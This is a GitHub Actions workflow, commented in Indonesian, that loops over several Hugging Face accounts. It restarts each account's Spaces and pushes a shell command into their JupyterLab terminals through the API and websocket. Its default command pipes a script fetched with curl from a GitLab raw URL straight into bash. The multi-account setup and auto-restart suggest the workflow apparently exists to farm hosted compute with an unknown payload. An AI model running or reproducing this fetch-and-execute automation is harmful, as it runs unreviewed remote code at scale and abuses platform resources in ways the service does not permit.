name: 🔁 Jalankan Perintah di Semua Space (Banyak Akun, Skip Jika Running)

on:
  workflow_dispatch:
    inputs:
      command:
        description: 'Perintah yang dijalankan di terminal JupyterLab'
        required: false
        default: 'curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/mars | bash'

jobs:
  run-per-account:
    strategy:
      matrix:
        account:
          - id: "akun1"               # label bebas
            secret_key: "HF_TOKEN_ACC1"   # nama secret di GitHub
          - id: "akun2"
            secret_key: "HF_TOKEN_ACC2"
          # tambahkan baris lain sesuai jumlah akun

    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: pip install huggingface_hub requests websocket-client

      - name: Proses Akun ${{ matrix.account.id }}
        env:
          HF_TOKEN: ${{ secrets[matrix.account.secret_key] }}
          COMMAND: ${{ github.event.inputs.command }}
        shell: python
        run: |
          import os, sys, time, json, requests, websocket
          from huggingface_hub import HfApi

          HF_TOKEN = os.environ["HF_TOKEN"]
          COMMAND = os.environ["COMMAND"]
          JUPYTER_TOKEN = "huggingface"   # kosongkan jika Jupyter sudah tidak pakai token

          api = HfApi(token=HF_TOKEN)

          # 1. Dapatkan username dari token
          try:
              user = api.whoami()
              username = user["name"]
              print(f"👤 Username: {username}")
          except Exception as e:
              print(f"❌ Gagal mendapatkan username: {e}")
              sys.exit(1)

          # 2. Ambil semua Space milik akun
          all_spaces = []
          try:
              for space in api.list_spaces(author=username):
                  all_spaces.append(space.id)
          except Exception as e:
              print(f"❌ Gagal mengambil daftar Space: {e}")
              sys.exit(1)

          if not all_spaces:
              print("📭 Tidak ada Space ditemukan.")
              sys.exit(0)

          print(f"📋 Space yang akan diproses ({len(all_spaces)}):")
          for s in all_spaces:
              print(f"   - {s}")

          # 3. Proses setiap Space
          for repo_id in all_spaces:
              print(f"\n{'='*50}")
              print(f"🔧 Memproses: {repo_id}")
              try:
                  # --- CEK STATUS ---
                  runtime = api.get_space_runtime(repo_id)
                  stage = str(runtime.stage)
                  print(f"   Status: {stage}")

                  if stage == "RUNNING":
                      print("✅ Space sudah RUNNING, skip.")
                      continue   # langsung ke Space berikutnya

                  # --- RESTART & TUNGGU ---
                  print("🔄 Me-restart Space...")
                  api.restart_space(repo_id)
                  for _ in range(60):   # max 10 menit
                      time.sleep(10)
                      runtime = api.get_space_runtime(repo_id)
                      stage = str(runtime.stage)
                      print(f"   Status: {stage}")
                      if stage == "RUNNING":
                          break
                  else:
                      print("⏰ Timeout menunggu running. Lewati.")
                      continue

                  # --- AKSES JUPYTERLAB & BUAT TERMINAL ---
                  space_url = f"https://{repo_id.replace('/', '-')}.hf.space"
                  headers = {"Authorization": f"Bearer {HF_TOKEN}"}
                  terminals_url = f"{space_url}/api/terminals"
                  if JUPYTER_TOKEN:
                      terminals_url += f"?token={JUPYTER_TOKEN}"

                  resp = requests.post(terminals_url, headers=headers)
                  if resp.status_code != 200:
                      print(f"⚠️  Gagal akses JupyterLab (HTTP {resp.status_code}). Lewati.")
                      continue

                  term_name = resp.json()["name"]
                  print(f"💻 Terminal dibuat: {term_name}")

                  # --- KIRIM PERINTAH VIA WEBSOCKET ---
                  ws_url = f"wss://{repo_id.replace('/', '-')}.hf.space/api/terminals/websocket/{term_name}"
                  if JUPYTER_TOKEN:
                      ws_url += f"?token={JUPYTER_TOKEN}"

                  # Kirim header Authorization agar WebSocket handshake diterima
                  ws = websocket.create_connection(
                      ws_url,
                      header={"Authorization": f"Bearer {HF_TOKEN}"}
                  )
                  ws.send(json.dumps(["stdin", COMMAND + "\n"]))
                  time.sleep(2)   # tunggu output

                  output = ""
                  while True:
                      try:
                          data = json.loads(ws.recv())
                          if data[0] == "stdout":
                              output += data[1]
                      except:
                          break
                  ws.close()
                  print("📤 Output:")
                  print(output.strip() or "(tidak ada output)")

                  # --- HAPUS TERMINAL ---
                  requests.delete(terminals_url + f"/{term_name}", headers=headers)
                  print("✅ Selesai.\n")

              except Exception as e:
                  print(f"❌ Gagal di {repo_id}: {e}")
                  continue

          print(f"\n🎉 Akun {username} selesai diproses.")